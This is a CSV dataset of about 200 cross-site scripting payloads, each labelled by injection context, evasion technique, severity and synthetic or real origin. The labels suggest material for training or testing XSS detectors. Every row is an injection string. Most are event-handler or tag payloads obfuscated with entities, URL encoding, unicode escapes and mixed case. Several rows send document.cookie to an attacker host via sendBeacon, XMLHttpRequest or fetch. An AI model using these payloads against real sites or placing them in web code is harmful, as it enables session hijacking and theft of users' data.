payload,context,technique,severity,length,source
"__pRotO__[""oNcaNplAy""]=eVal(doCumEnt.coOkiE)",dom_sink,synthetic,high,44,synthetic
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=consol&#101;.log(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)>"")",dom_sink,synthetic,low,127,synthetic
"Obj&#101;ct.&#97;ssign(window,{""ong&#101;stur&#101;&#101;nd"":prompt})",dom_sink,synthetic,low,69,synthetic
%22 onpagehide=alert(document.domain) %22,attribute_escape,synthetic,medium,41,synthetic
onr&#101;p&#101;&#97;t=&#97;l&#101;rt/***/(loc&#97;tion.h&#97;sh),event_handler,synthetic,low,65,synthetic
{{confirm %27XSS%27}},template_injection,synthetic,low,21,synthetic
\' oncanplay=console.log(location.hash)//,attribute_escape,synthetic,medium,41,synthetic
"<link
ondrop=prompt(docum&#101;nt.dom&#97;in)>",tag_injection,synthetic,medium,46,synthetic
"__proto__[""onscroll&#101;nd""]=f&#101;tch(bto&#97;(docum&#101;nt.cooki&#101;))",dom_sink,synthetic,low,77,synthetic
	onPlaYinG=aLerT(1),event_handler,synthetic,medium,19,synthetic
"<image3 draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</image3>",tag_injection,none,medium,88,real
onpointercancel=console.log(1),event_handler,synthetic,medium,30,synthetic
"<font onmouseover=""alert(1)"">AnonKryptiQuz</font>",tag_injection,none,medium,49,real
 onMouSeoVer=coNfiRm(1),event_handler,synthetic,medium,23,synthetic
%3Cobject	onsubmit=confirm(location.hash)%3E,tag_injection,synthetic,medium,44,synthetic
%3Ctitle onblur=console.log(location.hash)/%3E,tag_injection,synthetic,medium,46,synthetic
"\"" OnvOluMecHanGe=AleRt('XSS')//",attribute_escape,synthetic,medium,32,synthetic
"<u onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</u>",tag_injection,none,medium,58,real
"<s onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</s>",tag_injection,none,medium,61,real
<!--><video ondragstart=alert('XSS')>,tag_injection,synthetic,medium,37,synthetic
<input onpointerover=alert(1) style=display:block>AnonKryptiQuz</input>,tag_injection,none,medium,71,real
" onBegIn=ConFirM(STriNg.FroMChArCOde(88,83,83))",event_handler,synthetic,high,47,synthetic
\%22 ondblclick=confirm(1)//,attribute_escape,synthetic,medium,28,synthetic
	onAuxCliCk=ConFirM(dOcuMenT.dOmaIn),event_handler,synthetic,medium,36,synthetic
"""><MetA oNtrAnsItiOnsTarT=aLerT(lOcaTioN.hAsh)>",tag_injection,synthetic,medium,47,synthetic
"`""'><img src=xxx:x \x0Conerror=javascript:alert(1)>",js_uri,none,medium,51,real
"JavAscRipT:pRomPt(StrIng.frOmCHarCodE(88,83,83))",js_uri,synthetic,high,48,synthetic
\%27 onpointermove=confirm(document.domain)//,attribute_escape,synthetic,medium,45,synthetic
"<element onmousemove=""alert(1)"">AnonKryptiQuz</element>",tag_injection,none,medium,55,real
"<picture draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</picture>",tag_injection,none,medium,72,real
"""><img src=x onpointerrawupdate=prompt('XSS')>",attribute_escape,synthetic,medium,46,synthetic
"<frame ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</frame>",tag_injection,none,medium,91,real
%22 onclose=console.log(location.hash) %22,attribute_escape,synthetic,medium,42,synthetic
&quOt; onCanPlaY=pRomPt(DocUmeNt.DomAin) x=&qUot;,attribute_escape,synthetic,medium,49,synthetic
<script>/x/console.log(location.hash)</script>,script_injection,synthetic,medium,46,synthetic
__proto__[%22ontouchend%22]=fetch(document.cookie),dom_sink,synthetic,high,50,synthetic
' ><svg ong&#101;stur&#101;&#101;nd=consol&#101;.log('XSS')>,attribute_escape,synthetic,low,60,synthetic
<marquee onpointerdown=alert(1) style=display:block>AnonKryptiQuz</marquee>,tag_injection,none,medium,75,real
"<img src=x onerror=\x32""javascript:alert(0825)"">",js_uri,none,medium,48,real
j&#97;vascript:prompt(1),js_uri,synthetic,medium,24,synthetic
"<shadow oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,100,real
"<u onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</u>",tag_injection,none,medium,60,real
<title onstalled=\u0061lert('XSS')/>,tag_injection,synthetic,low,36,synthetic
{{$on.constructor('prompt('XSS')')()}},template_injection,synthetic,medium,38,synthetic
' ><svG oNseArcH=aLerT(1)>,attribute_escape,synthetic,medium,26,synthetic
"<th onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></th>",tag_injection,none,medium,277,real
"<dfn onmouseleave=""alert(1)"">AnonKryptiQuz</dfn>",tag_injection,none,medium,48,real
<boDy OnpOinTerMovE=aLerT(lOcaTioN.hAsh)/>,tag_injection,synthetic,medium,42,synthetic
 onpointerrawupdate=console.log(location.hash),event_handler,synthetic,medium,46,synthetic
<tbody id=x tabindex=1 onbeforeactivate=alert(1)></tbody>,tag_injection,none,medium,57,real
%27 ontouchend=prompt(%27XSS%27) %27,attribute_escape,synthetic,medium,36,synthetic
""" ><svg onwheel=alert('XSS')>",attribute_escape,synthetic,medium,29,synthetic
<script>javascript:alert(9764)</script\x0B,script_injection,none,medium,42,real
""" on&#101;rror=confirm(loc&#97;tion.h&#97;sh) """,attribute_escape,synthetic,medium,47,synthetic
"""%3E%3Cscript%3Ealert(location.hash)%3C/script%3E",script_injection,synthetic,medium,49,synthetic
{{{alert('XSS')}}},template_injection,synthetic,medium,18,synthetic
"<sVg/onfake=""x=y""oNload=;1^(co\u006efirm)``^1//",tag_injection,unicode_escape|case_variation,low,47,real
oncontextmenu=alert&#40;%27XSS%27&#41;,event_handler,synthetic,low,38,synthetic
<canvas onpointerover=alert(1) style=display:block>AnonKryptiQuz</canvas>,tag_injection,none,medium,73,real
"<iframe onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</iframe>",tag_injection,none,medium,69,real
"<li onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</li>",tag_injection,none,medium,61,real
`%3E%3Cimg src=x ondragstart=console.log(location.hash)%3E,attribute_escape,synthetic,medium,58,synthetic
<&#97;nim&#97;t&#101; onfocus=consol&#101;.log(docum&#101;nt.dom&#97;in)/>,tag_injection,synthetic,low,74,synthetic
"	onpageshow=prompt(String.fromCharCode(88,83,83))",event_handler,synthetic,high,49,synthetic
	onDroP=cOnsOle.loG(dOcuMenT.dOmaIn),event_handler,synthetic,medium,36,synthetic
	onwebkittransitionend=\u0061lert('XSS'),event_handler,synthetic,low,40,synthetic
onb&#101;for&#101;copy=&#97;l&#101;rt/**/(docum&#101;nt.dom&#97;in),event_handler,synthetic,low,67,synthetic
${alert(document.cookie)|n},template_injection,synthetic,high,27,synthetic
"<li onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</li>",tag_injection,none,medium,77,real
\' ontransitionend=alert(1)//,attribute_escape,synthetic,medium,29,synthetic
<frameset onload=alert(123)>,tag_injection,none,medium,28,real
	onKeyUp=ConFirM(lOcaTioN.hAsh),event_handler,synthetic,medium,31,synthetic
OnbLur=coNsoLe.Log&#40;1&#41;,event_handler,synthetic,low,29,synthetic
'><scr	ipt>confirm(1)</scr	ipt>,script_injection,synthetic,medium,31,synthetic
"<div draggable=""true"" contenteditable>drag me</div><menu ondragover=alert(1) contenteditable>drop here</menu>",tag_injection,none,medium,109,real
"<td
onkeyup=confirm(document.domain)>",tag_injection,synthetic,medium,37,synthetic
`%3E%3Cimg src=x onpointermove=confirm(document.domain)%3E,attribute_escape,synthetic,medium,58,synthetic
<anImaTemOtiOn	OnwAitIng=alErt(loCatIon.haSh)>,tag_injection,synthetic,medium,46,synthetic
"	onfullscreenchange=\u0061lert(String.fromCharCode(88,83,83))",event_handler,synthetic,high,61,synthetic
""" ongotpointercapture=prompt(String.fromCharCode(88,83,83)) """,attribute_escape,synthetic,high,61,synthetic
"<style>@keyframes slidein {}</style><figure style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></figure>",tag_injection,none,medium,166,real
\%27 oninvalid=alert(document.domain)//,attribute_escape,synthetic,medium,39,synthetic
"""><script>consol&#101;.log('XSS')</script>",script_injection,synthetic,low,42,synthetic
<button popovertarget=x>Click me</button><marquee onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</marquee>,tag_injection,none,medium,110,real
"<dd onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</dd>",tag_injection,none,medium,59,real
"%E5%98%8D%E5%98%8A%20<body onload=alert(""AnonKryptiQuz"")>",tag_injection,url_encoding,medium,57,real
"EleMenT.iNseRtADjaCenTHTML(""beForEenD"",""<iMg Src=x OneRroR=pRomPt(BtoA(dOcuMenT.cOokIe))>"")",dom_sink,synthetic,high,91,synthetic
\' onb&#101;for&#101;cut=consol&#101;.log(1)//,attribute_escape,synthetic,low,46,synthetic
OnsEleCt=ProMpt/***/(LocAtiOn.HasH),event_handler,synthetic,low,35,synthetic
"&lt;IMG SRC=\""   javascript&#058;alert('AnonKryptiQuz');\""&gt;",generic,html_entity,medium,62,real
%3Ca onbeforematch=prompt(document.domain)%3E,tag_injection,synthetic,medium,45,synthetic
"window[""&#101;v&#97;l""](1)",dom_sink,synthetic,low,26,synthetic
"<optgroup draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</optgroup>",tag_injection,none,medium,74,real
"element.setAttribute(%22onclick%22,%22fetch(btoa(document.cookie))%22)",dom_sink,synthetic,high,70,synthetic
"<xss onanimationstart=confirm(String.fromCharCode(88,83,83)) onanimationstart=confirm(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,117,synthetic
"document.querySelector(%22body%22).innerHTML+=%22XMLHttpRequest(String.fromCharCode(88,83,83))%22",dom_sink,synthetic,high,97,synthetic
\%22 onbegin=confirm(location.hash)//,attribute_escape,synthetic,medium,37,synthetic
<form><input formaction=javascript:alert(1) type=image src=SOURCE>,js_uri,none,medium,66,real
"<hgroup oncontextmenu=""alert(1)"">AnonKryptiQuz</hgroup>",tag_injection,none,medium,55,real
"<style>@keyframes slidein {}</style><noscript style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></noscript>",tag_injection,none,medium,170,real
<dialog onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,68,real
"<pre onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</pre>",tag_injection,none,medium,68,real
%27 ><svg onmousewheel=alert(document.domain)>,attribute_escape,synthetic,medium,46,synthetic
"<div draggable=""true"" contenteditable>drag me</div><blink ondrop=alert(1) contenteditable style=display:block>drop here</blink>",tag_injection,none,medium,127,real
"WinDow[""cOnfIrm""](DocUmeNt.CooKie+'&Loc='+LocAtiOn.HreF)",dom_sink,synthetic,high,56,synthetic
"\%22 onpointermove=alert(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,57,synthetic
' ><svg onscrollsnapchange=confirm('XSS')>,attribute_escape,synthetic,medium,42,synthetic
<!--><MarQueE oNscRolLsnApcHanGe=ProMpt(1)>,tag_injection,synthetic,medium,43,synthetic
"<rt onmouseup=""alert(1)"">AnonKryptiQuz</rt>",tag_injection,none,medium,43,real
"<script>setTimeout(%27alert(1)%27,0)</script>",script_injection,synthetic,medium,45,synthetic
onscrollend=javascript:alert('XSS'),event_handler,synthetic,medium,35,synthetic
"<x xmlns=""http://www.w3.org/2001/xml-events"" event=""load"" observer=""foo"" handler=""data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(104) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar""/>",attribute_escape,url_encoding,medium,295,real
"%3Csource	onvolumechange=confirm(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,66,synthetic
"<dfn onclick=""alert(1)"" style=display:block>AnonKryptiQuz</dfn>",tag_injection,none,medium,63,real
"\"" onscrollsn&#97;pch&#97;ng&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape,synthetic,medium,83,synthetic
<plAinTexT oNpaGerEveAl=AleRt(LocAtiOn.HasH)/>,tag_injection,synthetic,medium,46,synthetic
`><img src=x ondrop=confirm(1)>,attribute_escape,synthetic,medium,31,synthetic
`><img src=x onp&#97;g&#101;sw&#97;p=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,low,78,synthetic
 on&#101;nd=prompt(loc&#97;tion.h&#97;sh),event_handler,synthetic,medium,41,synthetic
"'><img src=x onpointerover=confirm(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,66,synthetic
<tr/onfocus=confirm('XSS')>,tag_injection,synthetic,medium,27,synthetic
"<div STYLE=""background-image: url(javascript:document.vulnerable=true;)"">",dom_sink,none,low,73,real
"<address onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</address>",tag_injection,none,medium,67,real
"<animatetransform ondragover=console.log(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,72,synthetic
"<style>:target {color:red;}</style><figure id=x style=""transition:color 1s"" ontransitionend=alert(1)></figure>",tag_injection,none,medium,110,real
"SetIntErvAl(""prOmpT(nAviGatOr.SenDBeAcoN('//aTtaCkeR.cOm',doCumEnt.coOkiE))"",100)",dom_sink,synthetic,high,81,synthetic
"""%3E%3Cmeta ondrop=alert(document.domain)%3E",tag_injection,synthetic,medium,44,synthetic
"<style>:target {transform: rotate(180deg);}</style><strike id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></strike>",tag_injection,none,medium,130,real
<noscript ongesturestart=\u0061lert('XSS')/>,tag_injection,synthetic,low,44,synthetic
"ontoggl&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,medium,61,synthetic
<obj&#101;ct onsubmit=confirm(loc&#97;tion.h&#97;sh) onsubmit=confirm(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,medium,93,synthetic
<&#97;nim&#97;t&#101;motion onw&#97;iting=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)/>,tag_injection,synthetic,low,81,synthetic
"\' onselect=prompt(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,51,synthetic
' ><svg onpointerup=\u0061lert(1)>,attribute_escape,synthetic,low,34,synthetic
<anImaTemOtiOn	OnaNimAtiOniTerAtiOn=ConSolE.lOg('XSS')>,tag_injection,synthetic,medium,55,synthetic
on&#97;uxclick=confirm&#40;docum&#101;nt.dom&#97;in&#41;,event_handler,synthetic,low,56,synthetic
"<ul onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</ul>",tag_injection,none,medium,57,real
<select onanimationstart=prompt(%27XSS%27)>,tag_injection,synthetic,medium,43,synthetic
"<thead onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</thead>",tag_injection,none,medium,71,real
"""><MarQueE oNprOmpTdiSmiSs=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",tag_injection,synthetic,high,70,synthetic
"<canvas onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</canvas>",tag_injection,none,medium,74,real
\' OnpOinTerDowN=cOnsOle.loG(dOcuMenT.dOmaIn)//,attribute_escape,synthetic,medium,47,synthetic
%EF%BC%9Cscript%EF%BC%9Ealert()%EF%BC%9C/script%EF%BC%9E,generic,url_encoding,medium,56,real
"' %3E%3Csvg onmouseup=prompt(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,62,synthetic
"element.insertAdjacentHTML(%22beforeend%22,%22<img src=x onerror=confirm(location.hash)>%22)",dom_sink,synthetic,medium,92,synthetic
 onpoint&#101;rup=prompt(loc&#97;tion.h&#97;sh),event_handler,synthetic,medium,47,synthetic
"' ondragover=console.log(String.fromCharCode(88,83,83)) '",attribute_escape,synthetic,high,57,synthetic
"element.insertAdjacentHTML(""beforeend"",""%3Cimg src=x onerror=XMLHttpRequest(btoa(document.cookie))%3E"")",dom_sink,synthetic,high,103,synthetic
"""><script+src=""https://api.cmi.aol.com/content/alert/homepage-alert?site=usaol&callback=confirm(1);//jQuery20108887725116629929_1528071050373472232&_=1528071050374""></script>",script_injection,none,medium,174,real
"""><p onbeforetoggle=\u0061lert(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,62,synthetic
"element.insertAdjacentHTML(""beforeend"",""<img src=x onerror=eval(navigator.sendBeacon('//attacker.com',document.cookie))>"")",dom_sink,synthetic,high,122,synthetic
onmous&#101;ov&#101;r=confirm&#40;1&#41;,event_handler,synthetic,low,40,synthetic
"__proto__[""onp&#97;st&#101;""]=XMLHttpR&#101;qu&#101;st('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)",dom_sink,synthetic,high,115,synthetic
"<hr onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</hr>",tag_injection,none,medium,57,real
"location.href=""javascr	ipt:XMLHttpRequest(document.cookie+'&loc='+location.href)""",dom_sink,synthetic,high,81,synthetic
"""><form onwebkitfullscreenchange=console.log(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,76,synthetic
"'><img src=x onpl&#97;ying=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,medium,75,synthetic
"java
script:confirm(document.domain)",js_uri,synthetic,medium,36,synthetic
"OnpRomPtdIsmIss=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))",event_handler,synthetic,high,58,synthetic
`><img src=x onp&#97;g&#101;r&#101;v&#101;&#97;l=consol&#101;.log(1)>,attribute_escape,synthetic,low,69,synthetic
%3Cbase onbeforecopy=console.log(location.hash)%3E,tag_injection,synthetic,medium,50,synthetic
onmous&#101;&#101;nt&#101;r=j&#97;v&#97;script:&#97;l&#101;rt(loc&#97;tion.h&#97;sh),event_handler,synthetic,low,84,synthetic
' onmousedown=confirm(1) ',attribute_escape,synthetic,medium,26,synthetic
<tiTle onCliCk=ConFirM('XSS') OncLicK=cOnfIrm('XSS')>,tag_injection,synthetic,medium,53,synthetic
<script>/*/consol&#101;.log('XSS')</script>,script_injection,synthetic,low,43,synthetic
"__pRotO__[""oNgeStuResTarT""]=evAl(DocUmeNt.CooKie+'&Loc='+LocAtiOn.HreF)",dom_sink,synthetic,high,71,synthetic
%22 ><svg onvolumechange=alert(document.domain)>,attribute_escape,synthetic,medium,48,synthetic
"%3Cscript%3EsetTimeout('prompt('XSS')',0)%3C/script%3E",script_injection,synthetic,medium,54,synthetic
{{{\u0061lert('XSS')}}},template_injection,synthetic,low,23,synthetic
"ongotpointercapture=\u0061lert&#40;String.fromCharCode(88,83,83)&#41;",event_handler,synthetic,high,69,synthetic
"<li draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</li>",tag_injection,none,medium,62,real
%3Cscript onclick=prompt('XSS') onclick=prompt('XSS')%3E,tag_injection,synthetic,medium,56,synthetic
"`%3E%3Cimg src=x onpopstate=confirm(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,69,synthetic
"<title oncut=""alert(1)"" contenteditable>AnonKryptiQuz</title>",tag_injection,none,medium,61,real
"EvaL(""ConSolE.lOg('//AttAckEr.Com/?c='+DocUmeNt.CooKie)"")",dom_sink,synthetic,high,57,synthetic
`><img src=x onmous&#101;ov&#101;r=prompt(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,medium,68,synthetic
<tr contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,56,real
"<style>:target {color: red;}</style><menu id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></menu>",tag_injection,none,medium,111,real
"<del onmousedown=""alert(1)"">AnonKryptiQuz</del>",tag_injection,none,medium,47,real
